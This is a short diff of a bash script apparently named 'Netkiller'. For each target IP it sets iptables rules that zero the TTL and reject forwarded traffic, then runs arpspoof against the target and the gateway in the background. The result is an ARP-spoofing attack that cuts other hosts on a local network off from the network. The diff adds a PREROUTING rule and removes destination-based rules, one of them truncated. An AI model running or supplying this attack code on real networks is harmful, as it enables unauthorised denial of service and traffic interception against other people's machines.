@@ -231,11 +231,9 @@ PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
      iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
+     iptables -t mangle -A PREROUTING -s "$TARGET" -j TTL --ttl-set 0
      iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-     iptables -A FORWARD -d "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
      iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
-     iptables -A FORWARD -d "$TARGET" -j REJECT --reject-with icmp-host-unreachabl
-     iptables -t mangle -A FORWARD -d "$TARGET" -j TTL --ttl-set 0
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
